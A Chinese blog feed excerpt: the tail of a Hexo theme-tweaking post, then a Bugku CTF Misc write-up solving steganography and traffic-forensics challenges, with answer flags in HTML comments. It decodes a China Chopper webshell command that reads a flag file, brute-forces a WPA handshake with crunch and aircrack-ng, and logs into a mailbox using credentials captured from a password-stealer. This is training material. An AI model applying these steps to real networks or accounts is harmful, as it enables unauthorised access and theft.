#更多按钮</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/more2.png" alt="" title="" class="">                <p></p>            </figure><p><br></p><h2 id="链接为域名"><a href="#链接为域名" class="headerlink" title="链接为域名"></a>链接为域名</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/link1.png" alt="" title="" class="">                <p></p>            </figure><p>在博客config文件里修改<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/link2.png" alt="" title="" class="">                <p></p>            </figure><br><br></p><h2 id="搜索按钮"><a href="#搜索按钮" class="headerlink" title="搜索按钮"></a>搜索按钮</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/menu1.png" alt="" title="" class="">                <p></p>            </figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">%</span></span></span><br><span class="line"><span class="tag">    <span class="attr">var</span> <span class="attr">menuItem</span>, <span class="attr">isActive</span> = <span class="string">function(item)</span> &#123;</span></span><br><span class="line"><span class="tag">        <span class="attr">var</span> <span class="attr">pageUrl</span> = <span class="string">url_for(page.path)</span></span></span><br><span class="line"><span class="tag">        <span class="attr">return</span> <span class="attr">item.url</span> === <span class="string">'/'</span> ? <span class="attr">pageUrl</span> === <span class="string">url_for(item.url</span> + '<span class="attr">index.html</span>') <span class="attr">:</span> <span class="attr">_.startsWith</span>(<span class="attr">pageUrl</span>, <span class="attr">url_for</span>(<span class="attr">item.url</span>))</span></span><br><span class="line"><span class="tag">    &#125;;</span></span><br><span class="line"><span class="tag">    <span class="attr">for</span> (<span class="attr">var</span> <span class="attr">i</span> <span class="attr">in</span> <span class="attr">theme.menu</span>) &#123;</span></span><br><span class="line"><span class="tag">      <span class="attr">menuItem</span> = <span class="string">theme.menu[i];</span></span></span><br><span class="line"><span class="tag">      <span class="attr">if</span> (<span class="attr">menuItem.url</span>) &#123;</span></span><br><span class="line"><span class="tag">    %&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"&lt;% if(isActive(menuItem))&#123; %&gt; active&lt;% &#125; %&gt;"</span>&gt;</span></span><br><span class="line">        &lt;a href="&lt;%- url_for(menuItem.url) %&gt;" &lt;% if(menuItem.target)&#123; %&gt;target="_blank"&lt;% &#125; %&gt; &gt;</span><br><span class="line">          <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"icon icon-lg icon-&lt;%= menuItem.icon %&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">%=(menuItem.text</span> || <span class="attr">_.startCase</span>(<span class="attr">i</span>)) %&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">%</span> &#125; <span class="attr">else</span> &#123; %&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">onclick</span>=<span class="string">"$('#site_search_btn').click();"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">"icon icon-lg icon-&lt;%= menuItem.icon %&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">%=(menuItem.text</span> || <span class="attr">_.startCase</span>(<span class="attr">i</span>)) %&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">%</span> &#125; &#125; %&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/blog/menu2.png" alt="" title="" class="">                <p></p>            </figure><p>注意这个search和其他的不一样，不能有url这个属性</p><h1 id="领养一个小姐姐"><a href="#领养一个小姐姐" class="headerlink" title="领养一个小姐姐"></a>领养一个小姐姐</h1><p>github地址：<a href="https://github.com/EYHN/hexo-helper-live2d" target="_blank" rel="noopener">https://github.com/EYHN/hexo-helper-live2d</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装模块：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在站点根目录的 _config.yml文件中添加配置.<br>示例:<br><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  enable: <span class="built_in">true</span></span><br><span class="line">  scriptFrom: <span class="meta">local</span></span><br><span class="line">  pluginRootPath: live2dw/</span><br><span class="line">  pluginJsPath: lib/</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  tagMode: <span class="built_in">false</span></span><br><span class="line">  debug: <span class="built_in">false</span></span><br><span class="line">  model:</span><br><span class="line">    use: ./source/live2d_models/live2d-widget-model-koharu #模型位置及名称</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: <span class="number">120</span></span><br><span class="line">    height: <span class="number">240</span></span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="built_in">true</span></span><br></pre></td></tr></table></figure></p><h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><p>1.使用<code>npm install 模型的包名</code>来安装，下载的包在node_modules里面<br>2.将下载的包扔进配置中的位置<code>./source/live2d_models/</code><br>模型预览：<a href="https://huaji8.top/post/live2d-plugin-2.0/" target="_blank" rel="noopener">https://huaji8.top/post/live2d-plugin-2.0/</a><br>以下为所有模型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru/01 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haru/02 (use npm install --save live2d-widget-model-haru)</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure></p><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bugku-Misc-writeup</title>
      <link href="/2018/03/14/Bugku-Misc-writeup/"/>
      <url>/2018/03/14/Bugku-Misc-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Bugku杂项题目writeup</p></blockquote><a id="more"></a><p>这里先放个连接：<a href="http://ctf.bugku.com" target="_blank" rel="noopener">ctf.bugku.com</a></p><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p>略……</p><h1 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/02-01.jpg" alt="" title="" class="">                <p></p>            </figure><p>用文本编辑器打开发现 UTF-8编码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/02-02.png" alt="" title="" class="">                <p></p>            </figure><br>在线解码<a href="https://utf8.supfree.net/" target="_blank" rel="noopener">https://utf8.supfree.net/</a>得到答案<br><!--key{you are right}--></p><h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><p>下载后发现是个压缩包，<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/03-01.png" alt="" title="" class="">                <p></p>            </figure><br>解压后得到一张图片，发现无法查看<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/03-02.png" alt="" title="" class="">                <p></p>            </figure><br>猜测是修改了图片高度，用WinHex打开图片，将第二行6列“01”改为“11”<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/03-03.png" alt="" title="" class="">                <p></p>            </figure><br>用画图打开发现flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/03-04.png" alt="" title="" class="">                <p></p>            </figure><br><!--BUGKU{a1e5aSA}--></p><h1 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h1><p>下载是个压缩包，里面是个流量包<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/04-01.png" alt="" title="" class="">                <p></p>            </figure><br>用wireshark打开，追踪tcp流<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/04-02.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/04-03.png" alt="" title="" class="">                <p></p>            </figure><br>拿到flag<br><!--flag{d316759c281bf925d600be698a4973d5}--></p><h1 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h1><p>下载得到一个名称为zip且没有后缀的文件，加上zip后缀后发现里面有个docx文档<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/05-01.png" alt="" title="" class="">                <p></p>            </figure><br>解压出来发现打不开，将后缀docx改为zip解压<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/05-02.png" alt="" title="" class="">                <p></p>            </figure><br>打开word里面的document.xml<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/05-03.png" alt="" title="" class="">                <p></p>            </figure><br>拿到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/05-04.png" alt="" title="" class="">                <p></p>            </figure></p><p style="display:none;">flag{F1@g}</p><h1 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h1><p>下载是又一张图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/06-01.png" alt="" title="" class="">                <p></p>            </figure><br>拿进kali用binwalk扫描一下<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/06-02.png" alt="" title="" class="">                <p></p>            </figure><br>接下来输入命令<br>dd if=2.jpg of=2-1.jpg skip=158792 bs=1<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/06-03.png" alt="" title="" class="">                <p></p>            </figure><br>得到另一张图片，拿到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/06-04.png" alt="" title="" class="">                <p></p>            </figure><br><!--falg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}--></p><h1 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h1><p>flag格式key{某人名字全拼}<br>下载得到一张图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/07-01.png" alt="" title="" class="">                <p></p>            </figure><br>好像毫无头绪，反正我脸盲，不过偷偷告诉你百度有百度识图功能<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/07-02.png" alt="" title="" class="">                <p></p>            </figure><br>Get flag<br><!--key{liuyifei}--></p><h1 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h1><p>flag格式：<br>flag{宽带用户名}<br>下载得到bin文件，用RouterPassView打开(RouterPassView是啥？自己百度)<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/08-01.png" alt="" title="" class="">                <p></p>            </figure><br>搜索username<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/08-02.png" alt="" title="" class="">                <p></p>            </figure><br>拿到flag<br><!--flag{053700357621}--></p><h1 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h1><p>下载得到一张图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/09-01.png" alt="" title="" class="">                <p></p>            </figure><br>将后缀改为rar，解压出来flag.rar和 提示.jpg<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/09-02.png" alt="" title="" class="">                <p></p>            </figure><br>flag.rar被加密查看提示，提示密码为三个数<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/09-03.png" alt="" title="" class="">                <p></p>            </figure><br>这里可以用暴力破解<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/09-04.png" alt="" title="" class="">                <p></p>            </figure><br>也可以解开谜题，三个国王分别指KJQ，在键盘上从左向右数序号分别为871<br>得到图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/09-05.png" alt="" title="" class="">                <p></p>            </figure><br>emmmmm。。。好吧，不过感觉应该没错，离答案不远了<br>此时用文本编辑器打开图片，在最后发现类似flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/09-06.png" alt="" title="" class="">                <p></p>            </figure><br>内容已被base64加密，解码得到flag<br>提交发现不对，修改下格式：flag{}<br><!--flag{y0u Are a h@cker!}--></p><h1 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h1><p>在做题过程中你会得到一个二维码图片<br>下载得到一个zip文件,解压出来是个exe文件<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/10-01.png" alt="" title="" class="">                <p></p>            </figure><br>用编辑器打开exe<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/10-02.png" alt="" title="" class="">                <p></p>            </figure><br>发现是用DATA URL将图片生成了数据流形式<br>用在线的base64图片编码得到图片 <a href="http://www.atool.org/img2base64.php" target="_blank" rel="noopener">http://www.atool.org/img2base64.php</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/10-03.png" alt="" title="" class="">                <p></p>            </figure><br>在线二维码识别得到flag <a href="http://www.atool.org/qrcode-scan.php" target="_blank" rel="noopener">http://www.atool.org/qrcode-scan.php</a><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-1/10-04.png" alt="" title="" class="">                <p></p>            </figure><br><!--KEY{dca57f966e4e4e31fd5b15417da63269}--></p><h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>linux基础问题<br>下载的到一个压缩包，解压出来一个flag的文件<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/11-01.png" alt="" title="" class="">                <p></p>            </figure><br>用WinHex打开flag，搜索key找到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/11-02.png" alt="" title="" class="">                <p></p>            </figure></p><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>将flag放到kali中，输入命令strings flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/11-03.png" alt="" title="" class="">                <p></p>            </figure><br>拿到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/11-04.png" alt="" title="" class="">                <p></p>            </figure><br><!--key{feb81d3834e2423c9903f4755464060b}--></p><h1 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h1><p>国产神器</p><p>下载得到一个压缩包，解压出来是流量包<br>用wireshark打开，因为是菜刀，猜测是http<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/12-01.png" alt="" title="" class="">                <p></p>            </figure><br>追踪http流<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/12-02.png" alt="" title="" class="">                <p></p>            </figure><br>将中间base64解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9IkM6XFx3d3dyb290XFxmbGFnLnRhci5neiI7JGZwPUBmb3BlbigkRiwncicpO2lmKEBmZ2V0YygkZnApKXtAZmNsb3NlKCRmcCk7QHJlYWRmaWxlKCRGKTt9ZWxzZXtlY2hvKCdFUlJPUjovLyBDYW4gTm90IFJlYWQnKTt9O2VjaG8oIlhAWSIpO2RpZSgpOw%3D%3D</span><br></pre></td></tr></table></figure></p><p>得到代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;@set_magic_quotes_runtime(0);&#125;;echo(&quot;X@Y&quot;);$F=&quot;C:\\wwwroot\\flag.tar.gz&quot;;$fp=@fopen($F,&apos;r&apos;);if(@fgetc($fp))&#123;@fclose($fp);@readfile($F);&#125;else&#123;echo(&apos;ERROR:// Can Not Read&apos;);&#125;;echo(&quot;X@Y&quot;);die();</span><br><span class="line">Ü</span><br></pre></td></tr></table></figure></p><p>从代码里可以看出传输文件flag.tar.gz，前后还有字符“X@Y”，正是刚才追踪到的传输的数据：<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/12-03.png" alt="" title="" class="">                <p></p>            </figure><br>最后一个http包，显示分组字节<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/12-04.png" alt="" title="" class="">                <p></p>            </figure><br>解码为 压缩，显示为ASCII，开始于3，得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/12-05.png" alt="" title="" class="">                <p></p>            </figure></p><h2 id="其他方法-1"><a href="#其他方法-1" class="headerlink" title="其他方法"></a>其他方法</h2><p>将流量包用binwalk分离<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/12-06.png" alt="" title="" class="">                <p></p>            </figure><br>得到压缩包，解压得到flag文件夹里的flag.txt<br>得到flag<br><!--key{8769fe393f2b998fa6a11afe2bfcd65e}--></p><h1 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h1><p>这么多数据包找找吧，先找到getshell的流<br>下载文件后解压，用wireshark打开CTF.pcapng，发现有很多包，快速浏览后发现前面都是攻击机（192.168.116.138）在向目标机（192.168.116.159）进行端口扫描，再往后看到5542已经getshell，追踪TCP数据流，发现txt文件<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/13-01.png" alt="" title="" class="">                <p></p>            </figure><br>对base64编码进行解密得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/13-02.png" alt="" title="" class="">                <p></p>            </figure><br><!--CCTF{do_you_like_sniffer}--></p><h1 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h1><p>解压的到一张图片，发现无法打开<br>用WinHex打开，将第二行第6列改为11<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/14-01.png" alt="" title="" class="">                <p></p>            </figure><br>用画图打开得到flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/14-02.png" alt="" title="" class="">                <p></p>            </figure><br><!--flag{He1l0_d4_ba1}--></p><h1 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h1><p>坚持60秒</p><p>下载jar，运行是个小游戏，<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/15-01.png" alt="" title="" class="">                <p></p>            </figure><br>好吧，有点难度，我们还是来做题吧。。。<br>解压缩jar，<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/15-02.png" alt="" title="" class="">                <p></p>            </figure><br>随便浏览了下，然后发现了flag<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/15-03.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/15-04.png" alt="" title="" class="">                <p></p>            </figure><br>解码后得到flag<br><!--flag{DajiDali_JinwanChiji}--></p><h1 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h1><p>flag格式：flag{你破解的WiFi密码}<br>tips：密码为手机号，为了不为难你，大佬特地让我悄悄地把前七位告诉你<br>1391040<em>**</em><br>Goodluck!!</p><p>下载是个流量包，先用wireshark打开查看一下<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/16-01.png" alt="" title="" class="">                <p></p>            </figure><br>WIFI连接认证的重点在WPA的四次握手包，也就是eapol协议的包，过滤一下。。。<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/16-02.png" alt="" title="" class="">                <p></p>            </figure><br>刚好是四个包，<br>提示密码是手机号码，而且前7位已经给出<br>可以使用kali的crunch工具生成字典<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: crunch &lt;min&gt; &lt;max&gt; [options]</span><br></pre></td></tr></table></figure></p><p>输入命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 11 11 -t 1391040%%%% &gt;&gt;wifipass.txt</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/16-03.png" alt="" title="" class="">                <p></p>            </figure><p>vi查看<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/16-04.png" alt="" title="" class="">                <p></p>            </figure><br>接下来破解WiFi密码，这个时候需要用到kaili上的aircrack-ng这个工具<br>输入命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w wifipass.txt wifi.cap</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/16-05.png" alt="" title="" class="">                <p></p>            </figure><p>选择3<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/16-06.png" alt="" title="" class="">                <p></p>            </figure><br>拿到flag<br><!--flag{13910407686}--></p><h1 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h1><p>给你点提示吧：key的格式是KEY{}<br>题目地址：链接: <a href="http://pan.baidu.com/s/1skJ6t7R" target="_blank" rel="noopener">http://pan.baidu.com/s/1skJ6t7R</a> 密码: s7jy</p><p>下载的到一个压缩包，解压得到一个文件，解法应该和Linux1一样，将文件放到linux下，<br>输入命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings brave</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/17-01.png" alt="" title="" class="">                <p></p>            </figure><p>发现这次内容非常多，而且key并不在最后，<br>此时可以将输出的内容生成txt文件<br>输入命令:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings brave &gt;&gt;brave.txt</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/17-02.png" alt="" title="" class="">                <p></p>            </figure><p>记事本打开查找key<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/17-03.png" alt="" title="" class="">                <p></p>            </figure><br>拿到flag<br><!--KEY{24f3627a86fc740a7f36ee2c7a1c124a}--></p><h1 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h1><p><a href="http://120.24.86.145:9001/" target="_blank" rel="noopener">http://120.24.86.145:9001/</a><br>flag格式flag{QB充值卡密}<br>充值地址<a href="http://pay.qq.com/" target="_blank" rel="noopener">http://pay.qq.com/</a><br>一血有qb拿</p><p>打开网址<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-01.png" alt="" title="" class="">                <p></p>            </figure><br>点击“Get flag”<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-02.png" alt="" title="" class="">                <p></p>            </figure><br>此时使用burpsuite代理<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-03.png" alt="" title="" class="">                <p></p>            </figure><br>得到下载地址<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-04.png" alt="" title="" class="">                <p></p>            </figure><br>得到一个123.exe,点击打开<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-05.png" alt="" title="" class="">                <p></p>            </figure><br>居然是个CF刷枪工具，仔细一想应该是个盗号程序。<br>随便填，然后准备提交，同时打开wireshark抓取流量<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-06.png" alt="" title="" class="">                <p></p>            </figure><br>发现有邮件传输的流量，追踪一下tcp流<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-07.png" alt="" title="" class="">                <p></p>            </figure><br>发现两个明显的base64编码，解码一下<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/18-08.png" alt="" title="" class="">                <p></p>            </figure><br>是个163的邮箱以及密码<br>登陆后找到flag<br><!--flag{182100518+725593795416}--></p><h1 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h1><p>下载是个zip文件，解压出来是一张大象的图片<br>先用binwalk扫一下<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/19-01.png" alt="" title="" class="">                <p></p>            </figure><br>发现有东西，那么用参数e尝试分离，出来一个压缩包，不过需要密码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/19-02.png" alt="" title="" class="">                <p></p>            </figure><br>再次查看题目，并没有提示需要爆破，“细心”猜测密码需要自己去找<br>最终在图片的属性中找到base64编码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/19-03.png" alt="" title="" class="">                <p></p>            </figure><br>解码后输入密码成功解压，又是一张图片<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Misc-2/19-04.png" alt="" title="" class="">                <p></p>            